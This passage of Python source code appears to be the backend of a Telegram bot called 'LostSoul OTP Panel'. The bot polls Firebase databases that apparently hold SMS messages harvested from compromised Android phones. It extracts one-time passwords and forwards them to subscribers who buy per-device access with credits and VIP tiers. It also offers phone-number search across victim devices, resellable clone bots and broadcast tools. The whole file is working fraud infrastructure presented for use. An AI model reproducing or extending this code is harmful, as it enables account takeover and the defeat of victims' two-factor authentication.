        except: await update.message.reply_text("⚠️ Numbers only."); return
        if val < 0: await update.message.reply_text("⚠️ Positive value."); return
        CONFIG["vip"][key] = val
        await save_data_async()
        await update.message.reply_text(f"✅ <b>{key}</b> = <b>{val}</b>", parse_mode="HTML")
        return

    if action == "crm_give" and is_admin:
        pending_action.pop(chat_id)
        try:
            parts = text.split(); uid = int(parts[0]); amt = int(parts[1])
            _add_credits(uid, amt, "admin gift")
            auto = check_auto_vip(bot_token, uid)
            await update.message.reply_text(
                f"✅ Gave {amt} to <code>{uid}</code>" + (" (auto-VIP granted)" if auto else ""),
                parse_mode="HTML")
        except: await update.message.reply_text("⚠️ Format: USER_ID AMOUNT")
        return
    if action == "crm_take" and is_admin:
        pending_action.pop(chat_id)
        try:
            parts = text.split(); uid = int(parts[0]); amt = int(parts[1])
            if remove_coins(users_db, uid, amt, "admin deduct"):
                await update.message.reply_text(f"✅ Took {amt} from <code>{uid}</code>", parse_mode="HTML")
            else:
                await update.message.reply_text("❌ Not enough balance.")
        except: await update.message.reply_text("⚠️ Format: USER_ID AMOUNT")
        return
    if action == "crm_vip" and is_admin:
        pending_action.pop(chat_id)
        try:
            parts = text.split(); uid = int(parts[0]); hrs = int(parts[1])
            users_db.setdefault(uid, {})
            cur = users_db[uid].get("vip_until", 0.0)
            users_db[uid]["vip_until"] = max(time.time(), cur) + hrs * 3600
            await update.message.reply_text(f"✅ {hrs}h VIP to <code>{uid}</code>", parse_mode="HTML")
        except: await update.message.reply_text("⚠️ Format: USER_ID HOURS")
        return

    if action == "gift_coins_all" and is_admin:
        pending_action.pop(chat_id)
        if not text.isdigit() or int(text) <= 0:
            await update.message.reply_text("⚠️ Invalid amount."); return
        amt = int(text)
        wait = await update.message.reply_text(f"⏳ Gifting {amt} to all...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token]["app"]
        targets = list(users_db.keys())
        async def send_gift(uid):
            _add_credits(uid, amt, "admin gift")
            try:
                await app_to_use.bot.send_message(uid, f"🎁 <b>SURPRISE!</b>\nAdmin gifted <b>{amt} credits</b>!", parse_mode="HTML")
                return True
            except: return False
        results = await asyncio.gather(*(send_gift(u) for u in targets), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        await wait.edit_text(f"✅ Sent to {sent}/{len(targets)} users.", parse_mode="HTML")
        return

    if action == "search_number":
        pending_action.pop(chat_id)
        s = re.sub(r"\D", "", text)
        if len(s) < 4:
            await update.message.reply_text("⚠️ At least 4 digits."); return
        wait = await update.message.reply_text("⏳ Searching...")
        devices = await get_all_devices(bot_token)
        found = [d for d in devices if any(s in n for n in d.numbers)]
        if not found:
            await wait.edit_text("📭 No matches."); return
        rows = []
        for d in found[:10]:
            icon = "🟢" if d.status == "online" else "🔴"
            rows.append([InlineKeyboardButton(f"{icon} {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")])
        rows.append([InlineKeyboardButton("❌", callback_data="close_msg")])
        await wait.edit_text(f"🔍 Results for {s}:", reply_markup=InlineKeyboardMarkup(rows))
        return

    if action == "broadcast_msg" and is_admin:
        pending_action.pop(chat_id)
        targets = chats_registry.get(bot_token, set())
        wait = await update.message.reply_text(f"⏳ Broadcasting to {len(targets)}...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token]["app"]
        async def send_bc(cid):
            if cid == chat_id: return False
            try:
                await app_to_use.bot.send_message(cid, text, parse_mode="HTML")
                return True
            except: return False
        results = await asyncio.gather(*(send_bc(c) for c in targets), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        await wait.edit_text(f"📢 Broadcast: {sent} sent, {len(targets)-sent} failed.")
        return

    if action == "add_custom_db" and not is_main_bot and is_admin:
        pending_action.pop(chat_id)
        if not text.startswith("http"):
            await update.message.reply_text("⚠️ Invalid URL."); return
        CLONES[bot_token]["custom_db"] = text
        await save_data_async()
        await update.message.reply_text("✅ Custom Firebase set.")
        return

# ══════════════════════════════════════════════════════════════
#  SMS FORWARDING
# ══════════════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return
    label = device_label(device)
    otp = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    kb_rows = []
    if otp: kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
    kb_rows.append([InlineKeyboardButton("📩 Messages", callback_data=f"msgs:{device.id}"),
                    InlineKeyboardButton("ℹ️ Info", callback_data=f"info:{device.id}")])
    markup = InlineKeyboardMarkup(kb_rows)
    send_tasks = []
    for bt, chat_dict in user_focus.items():
        if bt != TOKEN:
            if bt not in CLONES or time.time() > CLONES[bt]["expiry"]: continue
            app_to_use = CLONES[bt]["app"]; users_db_local = CLONES[bt]["users"]
        else:
            app_to_use = _main_app; users_db_local = all_users
        for cid, did in chat_dict.items():
            if did != device.id: continue
            if not has_device_access(bt, cid, device.id):
                continue
            if otp:
                users_db_local.setdefault(cid, {})["otp_count"] = users_db_local.get(cid, {}).get("otp_count", 0) + 1
            send_tasks.append(app_to_use.bot.send_message(cid, msg_text, reply_markup=markup, parse_mode="HTML"))
    if send_tasks:
        await asyncio.gather(*send_tasks, return_exceptions=True)

# ══════════════════════════════════════════════════════════════
#  POLL ENGINE
# ══════════════════════════════════════════════════════════════

async def poll_single_db(tag: str, url: str) -> int:
    try:
        st = FIREBASE_STATE.get(tag)
        r_main, r_user, r_root = await asyncio.gather(
            fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url))
        if r_main is None and r_user is None and r_root is None:
            if st:
                st["fail_count"] = st.get("fail_count", 0) + 1
                st["last_check"] = time.time()
                if st["fail_count"] >= INACTIVE_THRESHOLD and st["status"] != "hold":
                    st["status"] = "inactive"
            return 0
        if st:
            st["fail_count"] = 0; st["last_check"] = time.time()
            if st["status"] == "inactive": st["status"] = "active"
        forwarded = 0
        devs = GLOBAL_DEVICE_CACHE.get(tag, [])
        dev_map = {d.id: d for d in devs}
        for bulk in (r_main, r_user, r_root):
            if not isinstance(bulk, dict): continue
            for dev_id, sms_dict in bulk.items():
                if not isinstance(sms_dict, dict): continue
                device = dev_map.get(dev_id)
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): continue
                    sk = seen_key(dev_id, k)
                    if sk in seen_ids: continue
                    seen_ids.add(sk)
                    if device:
                        try:
                            await _forward_sms(device, sms); forwarded += 1
                        except: pass
        t4 = [d for d in devs if d.sms_path.endswith("receivedSms")]
        if t4:
            async def fetch_t4(d):
                fwd = 0
                sms_dict = await fb_get(d.sms_path, d.base_url)
                if isinstance(sms_dict, dict):
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        sk = seen_key(d.id, k)
                        if sk in seen_ids: continue
                        seen_ids.add(sk)
                        try:
                            await _forward_sms(d, sms); fwd += 1
                        except: pass
                return fwd
            results = await asyncio.gather(*(fetch_t4(d) for d in t4))
            forwarded += sum(results)
        return forwarded
    except: return 0

async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    while True:
        try:
            dbs = {n: u for n, u in DATABASES.items() if FIREBASE_STATE.get(n, {}).get("status") != "hold"}
            for ct, cd in CLONES.items():
                if time.time() < cd["expiry"] and cd.get("custom_db"):
                    dbs[f"C_{ct[:6]}"] = cd["custom_db"]
            for tag, url in dbs.items():
                try:
                    devs = await fetch_db_data(tag, url)
                    GLOBAL_DEVICE_CACHE[tag] = devs
                    st = ensure_state(tag)
                    st["device_count"] = len(devs); st["last_check"] = time.time()
                    if st["status"] != "hold":
                        st["fail_count"] = 0
                        if st["status"] == "inactive": st["status"] = "active"
                except:
                    st = ensure_state(tag)
                    st["fail_count"] = st.get("fail_count", 0) + 1
                    if st["fail_count"] >= INACTIVE_THRESHOLD and st["status"] != "hold":
                        st["status"] = "inactive"
            if first_run:
                for tag, url in dbs.items():
                    r_main, r_user, r_root = await asyncio.gather(
                        fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url))
                    for bulk in (r_main, r_user, r_root):
                        if not isinstance(bulk, dict): continue
                        for dev_id, sd in bulk.items():
                            if not isinstance(sd, dict): continue
                            for k in sd: seen_ids.add(seen_key(dev_id, k))
                    t4 = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
                    if t4:
                        async def init(d):
                            sd = await fb_get(d.sms_path, d.base_url)
                            if isinstance(sd, dict):
                                for k in sd: seen_ids.add(seen_key(d.id, k))
                        await asyncio.gather(*(init(d) for d in t4))
                first_run = False
                tlog("✅ LostSoul Engine ready!")
            else:
                await asyncio.gather(*(poll_single_db(t, u) for t, u in dbs.items()))
        except: pass
        await asyncio.sleep(POLL_INTERVAL)

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN: raise SystemExit("❌ TOKEN missing!")
    print("╔" + "═"*56 + "╗")
    print("  🤖 LOSTSOUL OTP PANEL — PER-DEVICE CREDIT ACCESS")
    print("  💰 Credits per Device • 👑 VIP • 🗄 Hidden DB Names")
    print("╚" + "═"*56 + "╝")

    app = (Application.builder().token(TOKEN)
        .connection_pool_size(1000).pool_timeout(60.0)
        .connect_timeout(30.0).read_timeout(30.0).write_timeout(30.0).build())

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        for name in DATABASES: ensure_state(name)
        for ct, cd in list(CLONES.items()):
            if time.time() < cd.get("expiry", 0):
                try:
                    tlog(f"Restarting clone: @{cd.get('username')}")
                    ca = await start_clone_bot(ct)
                    CLONES[ct]["app"] = ca
                except Exception as e:
                    tlog(f"Clone restart fail {ct}: {e}")
        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()